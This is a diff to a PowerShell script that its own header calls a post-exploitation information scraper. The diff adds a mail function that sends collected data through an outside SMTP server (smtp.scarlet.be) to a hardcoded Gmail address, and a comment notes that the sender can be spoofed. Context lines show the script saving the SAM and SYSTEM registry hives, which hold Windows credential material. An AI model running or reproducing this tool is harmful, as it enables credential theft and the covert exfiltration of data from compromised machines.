@@ -1,10 +1,10 @@
-##########################################################################################################
-###
-### 		Information scrapper : Post exploitation information scrapper  powershell script
-###
-### 		By AXANO
-###
-##########################################################################################################
+#############################################################################################################
+###																										  ###
+### 		Information scrapper : Post exploitation information scrapper  powershell script			  ###	
+###																										  ###		
+### 		By AXANO																					  ###	
+###																										  ###
+#############################################################################################################
 
 <#
 
@@ -43,7 +43,56 @@ https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-lo
 
 function Main(){
 initialize
-nonAdministrativeScrapperFunctions
+#nonAdministrativeScrapperFunctions
+#mail "test"
+}
+
+### SMTP mailing tool
+### Sends a mail using a free smtp server
+### $messageBody is send as message body in the mail
+function mail($messageBody){
+
+$smtpServer = "smtp.scarlet.be"
+
+ #Creating a Mail object
+ $msg = new-object Net.Mail.MailMessage
+
+ #Creating SMTP server object
+ $smtp = new-object Net.Mail.SmtpClient($smtpServer)
+ $smtp.Enablessl = $true
+ $smtp.port = 25
+ #Email structure 
+ ### !!!! From email can be spoofed
+ ### On 12/09/2018 you could still use any gmail account as sender and reciever (TESTED)
+ $msg.From = "powershell@gmail.com"
+ $msg.To.Add("perselis.e@gmail.com")
+
+ $msg.subject = "Scrapper information"
+
+
+ $msg.IsBodyHTML = $true
+ $msg.body = $messageBody +"<br /><br />"
+
+ $ok=$true 
+ Write-Host "SMTP Server:" $smtpserver "Port #:" $smtp.port "SSL Enabled?" $smtp.Enablessl
+ try{
+        $smtp.Send($msg)
+        Write-Host "SENT"
+
+ }
+ catch {
+    $error[0]
+    $_.Exception.Response
+    $ok=$false
+ }
+ finally{
+    $msg.Dispose()
+
+ }
+ if($ok){
+    Write-Host "EVERYTHING PASSED"
+ }
+
 }
 
 function initialize(){
@@ -118,5 +167,9 @@ reg save HKLM\SAM .\sam
 reg save HKLM\SYSTEM .\system
 }
 
+### Strict mode is scoped.
+### It prevents minor scripting errors like accessing non existent variables
+Set-StrictMode -Version Latest
 
+### Calling Main
 . Main
